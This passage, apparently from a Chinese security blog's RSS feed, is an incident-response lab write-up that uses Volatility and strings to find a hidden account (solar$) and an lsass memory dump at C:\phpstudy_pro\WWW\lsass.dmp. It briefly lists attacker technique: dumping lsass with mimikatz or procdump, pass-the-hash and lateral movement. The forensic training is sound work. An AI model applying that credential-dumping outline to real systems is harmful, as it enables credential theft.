+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009161510207_hu_ea9d027847555111.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009161510207_hu_19594335861ac7ba.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="106"
+data-flex-basis="255px"
+&gt;&lt;/p&gt;
+&lt;p&gt;创建用户猜测执行了 net user，使用下列命令&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;find . -name &amp;#34;pid.1716.dmp&amp;#34; -type f | head -5 | while read file; do
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; echo &amp;#34;=== 检查文件: $file ===&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; strings &amp;#34;$file&amp;#34; | grep &amp;#34;net user&amp;#34; | head -3
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;done
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009161916568.png"
+width="725"
+height="160"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009161916568_hu_15930dd282c10e17.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009161916568_hu_9f52cb688bed5d5d.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="453"
+data-flex-basis="1087px"
+&gt;&lt;/p&gt;
+&lt;p&gt;知道隐藏用户是&lt;code&gt;solar$&lt;/code&gt;，密码为&lt;code&gt;solar2025&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id="任务8vol_easy"&gt;【任务8】VOL_EASY
+&lt;/h2&gt;&lt;p&gt;黑客首次操作靶机的关键程序是什么？&lt;/p&gt;
+&lt;p&gt;使用以下命令：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;python3 vol.py -f vol_easy.vmem windows.pslist
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009162622880.png"
+width="726"
+height="56"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009162622880_hu_6d4e142cfb34affb.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009162622880_hu_1d0ba92d9066c8be.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="1296"
+data-flex-basis="3111px"
+&gt;&lt;/p&gt;
+&lt;p&gt;查看进程发现了lsass.exe进程&lt;/p&gt;
+&lt;p&gt;从 lsass.exe 中可以获取：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;所有本地用户密码哈希
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;域缓存凭据（如果加入域）
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;自动登录密码
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;服务账户密码
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;Kerberos认证材料
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;攻击者利用方式&lt;/code&gt;：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;span class="lnt"&gt;5
+&lt;/span&gt;&lt;span class="lnt"&gt;6
+&lt;/span&gt;&lt;span class="lnt"&gt;7
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;转储lsass内存（使用mimikatz、procdump等工具）
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;提取哈希和凭据
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;密码破解或哈希传递攻击
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;横向移动和权限提升
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;除了进程里的lsass.exe,在AntSword.exe的内存中也有与之相关的&lt;code&gt;dump_lass.bat&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009163646835.png"
+width="725"
+height="160"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009163646835_hu_662e665854ae4bf4.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009163646835_hu_2fab7b25f981cd6c.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="453"
+data-flex-basis="1087px"
+&gt;&lt;/p&gt;
+&lt;h2 id="任务9vol_easy"&gt;【任务9】VOL_EASY
+&lt;/h2&gt;&lt;p&gt;该关键程序的PID是多少？&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009164202364.png"
+width="726"
+height="56"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009164202364_hu_9588b967d1dab011.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009164202364_hu_adae3d998d2c6a27.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="1296"
+data-flex-basis="3111px"
+&gt;&lt;/p&gt;
+&lt;p&gt;由图可知，该关键程序的PID为&lt;code&gt;452&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id="任务10vol_easy"&gt;【任务10】VOL_EASY
+&lt;/h2&gt;&lt;p&gt;该关键程序的内存文件保存到了什么地方？&lt;/p&gt;
+&lt;p&gt;将&lt;code&gt;pid.1716.dmp&lt;/code&gt;用编辑器打开，找到文件保存地址&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009165014461.png"
+width="377"
+height="155"
+srcset="https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009165014461_hu_3243e0322dd957ce.png 480w, https://pdzl.github.io/p/solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-7%E6%9C%88/image-20251009165014461_hu_68a5f109da54f284.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="243"
+data-flex-basis="583px"
+&gt;&lt;/p&gt;
+&lt;p&gt;地址：&lt;code&gt;C:\\phpstudy_pro\\WWW\\lsass.dmp&lt;/code&gt;&lt;/p&gt;</description></item><item><title>SSRF靶场</title><link>https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/</link><pubDate>Wed, 01 Oct 2025 20:28:30 +0800</pubDate><guid>https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/</guid><description>&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/SSRF.png" alt="Featured image of post SSRF靶场" /&gt;&lt;h2 id="环境准备"&gt;环境准备
 &lt;/h2&gt;&lt;p&gt;靶场来源：&lt;a class="link" href="https://github.com/ProbiusOfficial/ssrf-labs" target="_blank" rel="noopener"
 &gt;靶场&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;下载后解压界面如下&lt;/p&gt;
